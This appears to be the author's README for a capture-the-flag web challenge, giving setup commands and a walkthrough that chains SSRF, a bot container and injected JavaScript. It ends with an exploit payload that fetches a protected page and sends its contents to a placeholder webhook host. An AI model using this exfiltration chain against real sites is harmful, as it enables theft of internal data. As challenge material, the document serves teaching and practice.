# Silk_Bridge  
My CTF for NexZero 2024

**Difficulty:** Medium → Hard  
**Estimated Time:** 30 minutes to 2 days

---

## 🚀 Usage

```bash
git clone <git-repo>
sudo chown -R 33:33 ./bot   # Bypass AppArmor restrictions on Linux
sudo docker compose up --build
```

---

## 💡 Idea

Bypass SSRF protection using client-side scripting + XSS to create an internal request chain.

---

## 🧩 Solution Walkthrough

1. You discover a reflected SSRF vulnerability in `check.php` via the `api` parameter.
2. Checking `robots.txt` reveals two hidden endpoints.
3. `secret.php` is protected against SSRF.
4. `dev_chat.php` is not protected, and reveals three key insights:
   - There is a JavaScript console in the web app.
   - A bot runs in a separate container.
   - The bot only visits a page when an internal server-side `fetch()` is triggered.
5. Using SSRF, you trigger an internal fetch → the bot visits your console → your JavaScript executes → the bot fetches `secret.php` and exfiltrates the flag.

   `Alert: the thing here is that the bot working from seperate container, if you think about it , you need to call the website by its 'domain' or 'web' , the bot won't reach the website if you call it 'localhost' `


This "bridge" between SSRF → internal fetch → bot JS execution is why the challenge is called **Silk Bridge**.

---

## 🧪 Exploit Script

```javascript
api=http://web/console.php?cmd=fetch('http://web/secret.php')
  .then(res => res.text())
  .then(data => fetch(`http://<webhook>?flag=${encodeURIComponent(data)}`))
